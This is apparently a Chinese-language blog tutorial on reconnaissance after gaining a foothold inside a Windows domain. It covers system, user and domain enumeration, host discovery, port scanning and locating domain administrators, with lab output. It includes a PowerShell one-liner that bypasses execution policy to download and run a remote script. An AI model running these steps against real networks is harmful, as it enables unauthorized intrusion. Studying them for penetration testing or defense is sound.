<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="内网渗透之信息收集"><meta name="keywords" content="内网渗透"><meta name="author" content="我是小吴啦"><meta name="copyright" content="我是小吴啦"><title>内网渗透之信息收集 | Chen's Blog</title><link rel="shortcut icon" href="/4.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内网信息收集"><span class="toc-number">2.</span> <span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基本信息"><span class="toc-number">2.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查询当前权限"><span class="toc-number">2.2.</span> <span class="toc-text">查询当前权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#判断是否存在域"><span class="toc-number">2.3.</span> <span class="toc-text">判断是否存在域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#探测域内存活主机"><span class="toc-number">2.4.</span> <span class="toc-text">探测域内存活主机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NetBIOS探测"><span class="toc-number">2.4.1.</span> <span class="toc-text">NetBIOS探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP探测"><span class="toc-number">2.4.2.</span> <span class="toc-text">ICMP探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARP探测"><span class="toc-number">2.4.3.</span> <span class="toc-text">ARP探测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#扫描域内端口"><span class="toc-number">2.5.</span> <span class="toc-text">扫描域内端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域信息"><span class="toc-number">2.6.</span> <span class="toc-text">域信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nltest信任域"><span class="toc-number">2.7.</span> <span class="toc-text">nltest信任域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找域控"><span class="toc-number">2.8.</span> <span class="toc-text">查找域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域用户信息"><span class="toc-number">2.9.</span> <span class="toc-text">域用户信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#定位域管"><span class="toc-number">2.10.</span> <span class="toc-text">定位域管</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概述"><span class="toc-number">2.10.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PsLoggedOn"><span class="toc-number">2.10.2.</span> <span class="toc-text">PsLoggedOn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PVEFindADUser"><span class="toc-number">2.10.3.</span> <span class="toc-text">PVEFindADUser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Netview"><span class="toc-number">2.10.4.</span> <span class="toc-text">Netview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap的NSE脚本"><span class="toc-number">2.10.5.</span> <span class="toc-text">Nmap的NSE脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerView"><span class="toc-number">2.10.6.</span> <span class="toc-text">PowerView</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找域管理进程"><span class="toc-number">2.11.</span> <span class="toc-text">查找域管理进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell收集信息"><span class="toc-number">2.12.</span> <span class="toc-text">Powershell收集信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其它"><span class="toc-number">2.13.</span> <span class="toc-text">其它</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#后话"><span class="toc-number">3.</span> <span class="toc-text">后话</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">我是小吴啦</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">99</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">14</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://jagger2zr.com" target="_blank" rel="noopener">Jagger</a><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">mochazz学长</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/bflw/" target="_blank" rel="noopener">强哥</a><a class="author-info-links__name text-center" href="http://p0desta.com/" target="_blank" rel="noopener">p0desta</a><a class="author-info-links__name text-center" href="https://github.com/Bypass007" target="_blank" rel="noopener">Bypass师傅</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Chen's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">内网渗透之信息收集</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-22</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        内网渗透的过程中，通过收集信息，可以洞察内网拓扑结构，找出内网中最薄弱的环节。</p>
<p>​    信息收集的深度，直接关系到内网渗透测试的成败</p>
<a id="more"></a>



<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a><strong>基本信息</strong></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># 网络信息</span><br><span class="line">$ ipconfig /all    # 查询网络配置信息</span><br><span class="line"></span><br><span class="line"># 系统信息</span><br><span class="line">$ systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"  # 查询操作系统和软件信息</span><br><span class="line">$ systeminfo       # 查看补丁列表</span><br><span class="line">$ wmic qfe get Caption,Description,HotFixID,InstallOn # 查看安装在系统的补丁</span><br><span class="line"></span><br><span class="line"># 服务信息</span><br><span class="line">$ wmic service list brief  # 查询本机服务信息</span><br><span class="line">$ wmic process list brief  # 查询进程列表</span><br><span class="line">$ wmic startup get commond,caption # 查看启动程序信息</span><br><span class="line"></span><br><span class="line"># 用户信息</span><br><span class="line">$ net user                       # 查询用户列表</span><br><span class="line">$ net localgroup Administrators  # 本地管理员</span><br><span class="line">$ query user || qwinsta          # 当前在线用户</span><br><span class="line"></span><br><span class="line"># 进程信息</span><br><span class="line">$ tasklist</span><br><span class="line">$ wmic process list brief</span><br><span class="line"></span><br><span class="line"># 其它信息</span><br><span class="line">$ netstat -ano  # 查询端口列表</span><br><span class="line">$ net share     # 查询本机共享列表</span><br><span class="line">$ route print   # 路由表</span><br><span class="line">$ arp -a        # ARP表</span><br><span class="line">$ ipconfig /displaydns    # 查看dns缓存</span><br><span class="line">$ netsh firewall show config  # 查询防火墙相关配置</span><br></pre></td></tr></table></figure>



<h2 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a><strong>查询当前权限</strong></h2><ul>
<li>获取一台主机后，一般有3种情况：<ul>
<li>本地普通用户，<code>win-2008\user</code></li>
<li>本地管理员用户，<code>win7-test\administrator</code></li>
<li>域内用户，<code>hacker\administrator</code></li>
</ul>
</li>
<li>其中本地普通用户只能查询本机信息，不能查询域内信息，而本地管理员和域内用户均可查询域内信息。</li>
<li>域内所有查询都通过域控制器(DC)实现，而这个查询会自动使用Kerberos协议进行认证，无须输入账号密码。</li>
<li>获取域SID<ul>
<li>当前域<code>hack-naraku</code>的SID：<code>S-1-5-21-1481718049-2714097393-3961720286</code></li>
<li>域用户<code>winuser</code>的SID：<code>S-1-5-21-1481718049-2714097393-3961720286-1108</code></li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> whoami</span></span><br><span class="line"></span><br><span class="line">用户名              SID</span><br><span class="line">=================== ==============================================</span><br><span class="line">hack-naraku\winuser S-1-5-21-1481718049-2714097393-3961720286-1108</span><br></pre></td></tr></table></figure>

<ul>
<li>查询指定用户信息<ul>
<li>该用户在本地组中没有本地管理员权限</li>
<li>在域中属于<code>Domain Users</code>组</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> net user winuser /domain</span></span><br><span class="line"></span><br><span class="line">.............</span><br><span class="line">本地组成员</span><br><span class="line">全局组成员             *Domain Users</span><br><span class="line">.............</span><br></pre></td></tr></table></figure>



<h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><ul>
<li>使用<code>ipconfig</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ipconfig /all</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nslookup &lt;DNS服务器&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查询系统信息<ul>
<li>域：域名。如果域为<code>WORKGROUP</code>则表示当前服务器不在域内</li>
<li>登录服务器：域控制器</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> systeminfo</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查询当前登录域及登录用户<ul>
<li>工作站域DNS名称：域名。如果为<code>WORKGROUP</code>则表示当前为非域环境</li>
<li>登录域：用于表示当前表示的用户是域用户还是本地用户</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> net config workstation</span></span><br></pre></td></tr></table></figure>

<ul>
<li>判断主域<ul>
<li>正常执行：存在域，且当前用户是域用户</li>
<li>拒绝访问：存在域，但当前用户不是域用户</li>
<li>找不到域<code>WORKGROUP</code>的域控制器：不存在域</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> net time /domain</span></span><br></pre></td></tr></table></figure>

<h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><h3 id="NetBIOS探测"><a href="#NetBIOS探测" class="headerlink" title="NetBIOS探测"></a>NetBIOS探测</h3><ul>
<li><code>nbtscan.exe</code>：一个命令行工具，用于扫描目标网络中开放的NetBIOS名称服务器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nbtscan.exe 192.168.1.0/24</span></span><br><span class="line"></span><br><span class="line">192.168.1.7     HACK-NARAKU\WIN7                SHARING</span><br><span class="line">192.168.1.12    HACK-NARAKU\DC                  SHARING DC</span><br><span class="line">*timeout (normal end of scan)</span><br></pre></td></tr></table></figure>

<h3 id="ICMP探测"><a href="#ICMP探测" class="headerlink" title="ICMP探测"></a>ICMP探测</h3><ul>
<li>对指定网段中的每个IP地址使用<code>ping</code>命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="keyword">for</span> /L %I <span class="keyword">in</span> (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr <span class="string">"TTL="</span></span></span><br><span class="line"></span><br><span class="line">来自 192.168.1.7 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">来自 192.168.1.12 的回复: 字节=32 时间=1ms TTL=128</span><br></pre></td></tr></table></figure>

<h3 id="ARP探测"><a href="#ARP探测" class="headerlink" title="ARP探测"></a>ARP探测</h3><ul>
<li><code>arp-scan.exe</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> arp-scan.exe -t 192.168.1.0/24</span></span><br><span class="line"></span><br><span class="line">Reply that 00:50:56:C0:00:01 is 192.168.1.1 in 2.870200</span><br><span class="line">Reply that 00:0C:29:0A:7C:7F is 192.168.1.7 in 0.060100</span><br><span class="line">Reply that 00:0C:29:93:97:DC is 192.168.1.12 in 16.301800</span><br><span class="line">Reply that 00:50:56:EA:98:CF is 192.168.1.254 in 15.253300</span><br><span class="line">Reply that 00:0C:29:0A:7C:7F is 192.168.1.255 in 0.102700</span><br></pre></td></tr></table></figure>

<h2 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h2><ul>
<li><strong>Metasploit端口扫描</strong>：MSF提供多种端口扫描技术，还提供与其它扫描工具的接口<ul>
<li>可在<code>msfconsole</code>下运行<code>search portscan</code>搜索端口扫描模块</li>
<li>这里使用的是<code>auxiliary/scanner/portscan/tcp</code></li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> msfconsole</span></span><br><span class="line">msf5 &gt; use auxiliary/scanner/portscan/tcp </span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; show options</span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set RHOSTS 192.168.1.12</span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set PORTS 1-1024</span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.12:         - 192.168.1.12:53 - TCP OPEN</span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.12:         - 192.168.1.12:636 - TCP OPEN</span><br><span class="line">[*] 192.168.1.12:         - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>Nmap</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sP 192.168.1.0/24</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Netcat：端口Banner信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nc -nv 192.168.1.12 22</span></span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://github.com/samratashok/nishang/" target="_blank" rel="noopener">Nishang</a>中的<code>Scan/Invoke-PortScan.ps1</code>模块</li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">PowerSploit</a>中的<code>Recon/Invoke-PortScan.ps1</code>脚本</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程下载脚本并执行</span></span><br><span class="line"><span class="variable">$</span> powershell.exe <span class="literal">-nop</span> <span class="literal">-exec</span> bypass <span class="literal">-c</span> <span class="string">"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports '80,445,1433,8080,3389' -oA temp.txt"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行本地ps脚本</span></span><br><span class="line"><span class="variable">$</span> powershell.exe <span class="literal">-nop</span> <span class="literal">-exec</span> bypass <span class="literal">-c</span> <span class="string">"Import-Module C:\Invoke-Portscan.ps1; Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports '80,445,1433,8080,3389' -oA temp.txt"</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>其它</p>
<ul>
<li>telnet：需要先开启telnet服务</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> telnet 192.168.1.12 22</span></span><br></pre></td></tr></table></figure>

<ul>
<li>S扫描器：早期的一个扫描器</li>
</ul>
</li>
</ul>
<h2 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> net view /domain                      <span class="comment"># 查询域</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net view /domain:HACK-NARAKU          <span class="comment"># 查询域内所有计算机</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net group /domain                     <span class="comment"># 查询域内所有用户组</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net group <span class="string">"domain computers"</span> /domain  <span class="comment"># 查询所有域成员</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net accounts /domain                  <span class="comment"># 查询域密码策略</span></span></span><br></pre></td></tr></table></figure>

<h2 id="nltest信任域"><a href="#nltest信任域" class="headerlink" title="nltest信任域"></a>nltest信任域</h2><ul>
<li>信任域：可以在工作组里查询，查询内网是否有域环境<ul>
<li>参考：<a href="https://www.cnblogs.com/dreamer-fish/p/3473895.html" target="_blank" rel="noopener">Nltest相关命令</a></li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nltest /domain_trusts</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 返回所有信任 192.168.1.7 的域</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nltest /domain_trusts /all_trusts /v /server:&lt;域控IP&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 返回域控和其相对应的IP地址,XXXXX是上一条命令结果中的一个域</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nltest /dsgetdc:&lt;XXXXX&gt; /server:192.168.1.12</span></span><br></pre></td></tr></table></figure>

<h2 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h2><ul>
<li>查看域控的机器名</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nltest /DCLIST:hack-naraku</span></span><br><span class="line"></span><br><span class="line">获得域“hack-naraku”中 DC 的列表(从“\\DC”中)。</span><br><span class="line">    DC.hack.naraku [PDC]  [DS] 站点: Default-First-Site-Name</span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure>

<ul>
<li>查看域控的主机名</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nslookup -<span class="built_in">type</span>=SRV _ldap._tcp</span></span><br><span class="line"></span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was 2 seconds.</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  192.168.1.12</span><br><span class="line"></span><br><span class="line">_ldap._tcp.hack.naraku  SRV service location:</span><br><span class="line">          priority       = 0</span><br><span class="line">          weight         = 100</span><br><span class="line">          port           = 389</span><br><span class="line">          svr hostname   = dc.hack.naraku</span><br><span class="line">dc.hack.naraku  internet address = 192.168.1.12</span><br></pre></td></tr></table></figure>

<ul>
<li>查看时间</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> net time /domain</span></span><br><span class="line"></span><br><span class="line">\\DC.hack.naraku 的当前时间是 2020/10/19 12:38:28</span><br></pre></td></tr></table></figure>

<ul>
<li>查看域控组</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> net group <span class="string">"Domain Controllers"</span> /domain</span></span><br><span class="line"></span><br><span class="line">这项请求将在域 hack.naraku 的域控制器处理。</span><br><span class="line"></span><br><span class="line">组名     Domain Controllers</span><br><span class="line">注释     域中所有域控制器</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"><span class="meta">DC$</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>



<h2 id="域用户信息"><a href="#域用户信息" class="headerlink" title="域用户信息"></a>域用户信息</h2><ul>
<li>查询所有域用户列表</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> net user /domain               <span class="comment"># 向域控进行查询</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wmic useraccount get /all      <span class="comment"># 获取域内用户信息</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net localgroup administrators  <span class="comment"># 查询本地管理员组用户</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>查询域管理员用户</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> net group <span class="string">"Domain Admins"</span> /domain     <span class="comment"># 查询域管理员用户</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> net group <span class="string">"Enterprise Admins"</span> /domain <span class="comment"># 查询管理员用户组</span></span></span><br></pre></td></tr></table></figure>



<h2 id="定位域管"><a href="#定位域管" class="headerlink" title="定位域管"></a>定位域管</h2><ul>
<li>参考：<a href="https://www.cnblogs.com/riyir/p/12735443.html" target="_blank" rel="noopener">定位域管理员</a></li>
</ul>
<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote>
<p>在一个域中，当计算机加入域后，会默认给域管理员赋予本地系统管理员权限。因此，域管理员均可以访问本地计算机，且具备完全控制权限。</p>
</blockquote>
<p>​        定位域内管理员的两种渠道：日志和会话。</p>
<ul>
<li>日志是指本地机器的管理员日志，可以使用脚本或<code>Wevtutil</code>工具导出并查看。</li>
<li>会话是指域内每台机器的登陆会话，可以使用<code>netsess.exe</code>或<code>PowerView</code>等工具查询（可匿名查询，无需权限）。</li>
</ul>
<h3 id="PsLoggedOn"><a href="#PsLoggedOn" class="headerlink" title="PsLoggedOn"></a>PsLoggedOn</h3><blockquote>
<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon" target="_blank" rel="noopener">PsLoggedOn.exe</a>：可以查看本地登录的用户</p>
</blockquote>
<ul>
<li>原理：通过检验注册表里<code>HKEY_USERS</code>的key值来查询谁登陆过机器(调用<code>NetSessionEnum API</code>)</li>
<li>限制：部分功能需要管理员权限</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> PsLoggedon.exe</span></span><br></pre></td></tr></table></figure>





<h3 id="PVEFindADUser"><a href="#PVEFindADUser" class="headerlink" title="PVEFindADUser"></a>PVEFindADUser</h3><blockquote>
<p><a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn" target="_blank" rel="noopener">PVEFindADUser.exe</a>：用于查找Active Directory用户的登录位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括本地用户、通过RDP登陆的用户、用于运行服务和计划任务的用户。</p>
</blockquote>
<ul>
<li>限制：运行该工具需要配置<code>.NET Framework 2.0</code>环境，并且需要具有管理员权限。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> PVEFindADUser.exe -current</span></span><br></pre></td></tr></table></figure>





<h3 id="Netview"><a href="#Netview" class="headerlink" title="Netview"></a>Netview</h3><blockquote>
<p><a href="https://github.com/mubix/netview" target="_blank" rel="noopener">Netview.exe</a>：使用<code>WinAPI</code>枚举系统，利用<code>NetSessionEnum</code>找寻登陆会话，利用<code>NetShareEnum</code>找寻共享，利用<code>NetWkstaUserEnum</code>枚举登陆用户。同时，<code>netview.exe</code>能够查询共享入口和有价值的用户。</p>
</blockquote>
<ul>
<li>编译版本：<a href="https://malicious.link/projects/netview.exe" target="_blank" rel="noopener">https://malicious.link/projects/netview.exe</a></li>
<li>限制：绝大多数功能不需要管理员权限</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> netview.exe -d</span></span><br></pre></td></tr></table></figure>





<h3 id="Nmap的NSE脚本"><a href="#Nmap的NSE脚本" class="headerlink" title="Nmap的NSE脚本"></a>Nmap的NSE脚本</h3><blockquote>
<p><a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html" target="_blank" rel="noopener">Smb-enum-sessions.nse</a>：如果存在域账户或者本地账户，就可以使用该脚本获取远程机器的登陆会话</p>
</blockquote>
<ul>
<li>限制：不需要管理员权限</li>
</ul>
